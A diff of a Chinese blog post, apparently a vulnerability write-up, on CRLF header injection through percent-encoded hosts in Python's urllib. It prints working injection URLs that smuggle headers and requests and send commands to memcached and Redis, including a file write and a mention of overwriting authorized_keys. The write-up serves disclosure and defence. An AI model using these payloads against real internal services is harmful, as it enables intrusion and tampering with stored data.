@@ -75,7 +75,7 @@
 
 <p>HTTP协议解析host的时候可以接受百分号编码的值，解码，然后包含在HTTP数据流里面，但是没有进一步的验证或者编码，这就可以注入一个换行符。</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="c">#!/usr/bin/env python3</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python3</span>
 
 <span class="kn">import</span> <span class="nn">sys</span>
 <span class="kn">import</span> <span class="nn">urllib</span>
@@ -89,62 +89,54 @@
     <span class="k">print</span><span class="p">(</span><span class="n">info</span><span class="p">)</span>
 <span class="k">except</span> <span class="n">urllib</span><span class="o">.</span><span class="n">error</span><span class="o">.</span><span class="n">URLError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
     <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>这段代码只是从命令行参数接收一个URL，然后去访问它。为了查看<code class="highlighter-rouge">urllib</code>获取的HTTP头，我们用一个nc来监听端口。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>nc -l -p 12345
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -l -p 12345
+</code></pre></div></div>
 
 <p>在正常的代码中，我们可以这样访问</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>./fetch3.py http://127.0.0.1:12345/foo
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./fetch3.py http://127.0.0.1:12345/foo
+</code></pre></div></div>
 
 <p>返回的HTTP头是</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>GET /foo HTTP/1.1
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /foo HTTP/1.1
 Accept-Encoding: identity
 User-Agent: Python-urllib/3.4
 Connection: close
 Host: 127.0.0.1:12345
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>然后我们使用恶意构造的地址</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>./fetch3.py http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./fetch3.py http://127.0.0.1%0d%0aX-injected:%20header%0d%0ax-leftover:%20:12345/foo
+</code></pre></div></div>
 
 <p>返回的HTTP头就是</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>GET /foo HTTP/1.1
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /foo HTTP/1.1
 Accept-Encoding: identity
 User-Agent: Python-urllib/3.4
 Host: 127.0.0.1
 X-injected: header
 x-leftover: :12345
 Connection: close
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>然后攻击者可以任意注入HTTP头了。</p>
 
 <p>这个攻击在使用域名的时候也可以进行，但是要插入一个空字节才能进行DNS查询。比如说，下面的URL进行解析会失败的。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>http://localhost%0d%0ax-bar:%20:12345/foo
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost%0d%0ax-bar:%20:12345/foo
+</code></pre></div></div>
 
 <p>但是下面的URL是可以正常解析并访问到127.0.0.1的</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>http://localhost%00%0d%0ax-bar:%20:12345/foo
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://localhost%00%0d%0ax-bar:%20:12345/foo
+</code></pre></div></div>
 
 <p>要注意的是HTTP重定向也可以利用这个漏洞，如果攻击者提供的URL是一个恶意的web server，然后服务器可以重定向到其他的URL也可以导致协议注入。</p>
 
@@ -156,23 +148,21 @@ Connection: close
 
 <p>这个攻击方式由来已久了，但是和<a href="http://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">以前的请求伪造</a>不同的是，这里仅仅是可以注入额外的HTTP头和请求方法。当然当前场景下，能够提交不同的HTTP方法和请求数据就已经很有用了，比如说原始的请求是这样的</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>GET /foo HTTP/1.1
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /foo HTTP/1.1
 Accept-Encoding: identity
 User-Agent: Python-urllib/3.4
 Host: 127.0.0.1
 Connection: close
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>攻击者可以注入一个额外的完整的HTTP请求头</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>http://127.0.0.1%0d%0aConnection%3a%20Keep-Alive%0d%0a%0d%0aPOST%20%2fbar%20HTTP%2f1.1%0d%0aHost%3a%20127.0.0.1%0d%0aContent-Length%3a%2031%0d%0a%0d%0a%7b%22new%22%3a%22json%22%2c%22content%22%3a%22here%22%7d%0d%0a:12345/foo
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1%0d%0aConnection%3a%20Keep-Alive%0d%0a%0d%0aPOST%20%2fbar%20HTTP%2f1.1%0d%0aHost%3a%20127.0.0.1%0d%0aContent-Length%3a%2031%0d%0a%0d%0a%7b%22new%22%3a%22json%22%2c%22content%22%3a%22here%22%7d%0d%0a:12345/foo
+</code></pre></div></div>
 
 <p>这个的响应是</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>GET /foo HTTP/1.1
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /foo HTTP/1.1
 Accept-Encoding: identity
 User-Agent: Python-urllib/3.4
 Host: 127.0.0.1
@@ -185,8 +175,7 @@ Content-Length: 31
 {"new":"json","content":"here"}
 :12345
 Connection: close
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>demo中注入的完整的请求头在Apache HTTPD下是工作的，但是其他的server不一定能正确的解析或者利用。这种攻击可以用在内网攻击上，比如未授权的REST、SOAP或者类似的服务<a href="http://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html">Exploiting Server Side Request Forgery on a Node/Express Application (hosted on Amazon EC2)</a></p>
 
@@ -196,13 +185,12 @@ Connection: close
 
 <p>这样，如果我们可以控制内网的Python访问一个URL，然后我们就可以轻松的访问memcached了，比如</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>http://127.0.0.1%0d%0aset%20foo%200%200%205%0d%0aABCDE%0d%0a:11211/foo
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1%0d%0aset%20foo%200%200%205%0d%0aABCDE%0d%0a:11211/foo
+</code></pre></div></div>
 
 <p>就会产生下面的HTTP头</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>GET /foo HTTP/1.1
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET /foo HTTP/1.1
 Accept-Encoding: identity
 Connection: close
 User-Agent: Python-urllib/3.4
@@ -210,12 +198,11 @@ Host: 127.0.0.1
 set foo 0 0 5
 ABCDE
 :11211
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>当检查下面几行memcached的协议语法的时候，大部分都是语法错误，但是memcached在收到错误的命令的时候并不会关闭连接，这样攻击者就可以在请求的任何位置注入命令了，然后memcached就会执行。下面是memcached的响应（memcached是Debian下包管理默认配置安装的）</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>ERROR
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ERROR
 ERROR
 ERROR
 ERROR
@@ -223,8 +210,7 @@ ERROR
 STORED
 ERROR
 ERROR
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>经过确认，memcached中确实成功的插入了<code class="highlighter-rouge">foo</code>的值。这种场景下，攻击者就可以给内网的memcached实例发送任意命令了。如果应用依赖于memcached中存储的数据（比如用户的session数据，HTML或者其他的敏感数据），攻击者可能获取应用更高的权限了。这个利用方式还可以造成拒绝服务攻击，就是攻击者可以在memcached中存储大量的数据。</p>
 
@@ -232,26 +218,23 @@ ERROR
 
 <p>Redis和memcached很相似，因为都提供了数据备份存储，一些内置数据类型，还能执行Lua脚本。前几年Quite a bit公布了攻击Redis的一些方法（<a href="https://benmmurphy.github.io/blog/2015/06/04/redis-eval-lua-sandbox-escape/">链接1</a> <a href="http://antirez.com/news/96">链接2</a> <a href="http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">链接3</a>）。和memcached类似，Redis提供了TCP协议的接口，然后也可以执行一堆错误命令中的正确命令。另外，还可以利用Redis在写任意文件，攻击者可以控制一部分文件内容。比如下面的URL在<code class="highlighter-rouge">/tmp/evil</code>下创建了一个数据库文件。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0aSET%20foo%20bar%0d%0aSAVE%0d%0a:6379/foo
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1%0d%0aCONFIG%20SET%20dir%20%2ftmp%0d%0aCONFIG%20SET%20dbfilename%20evil%0d%0aSET%20foo%20bar%0d%0aSAVE%0d%0a:6379/foo
+</code></pre></div></div>
 
 <p>然后可以看到刚才存储的一些键值对数据</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code># strings -n 3 /tmp/evil
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># strings -n 3 /tmp/evil
 REDIS0006
 foo
 bar
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>理论上，攻击者就可以利用Redis创建或者改写一些敏感文件了，包括</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code> ~redis/.profile
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> ~redis/.profile
  ~redis/.ssh/authorized_keys
 ...
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h2 id="多版本的python都受到影响">多版本的Python都受到影响</h2>
 
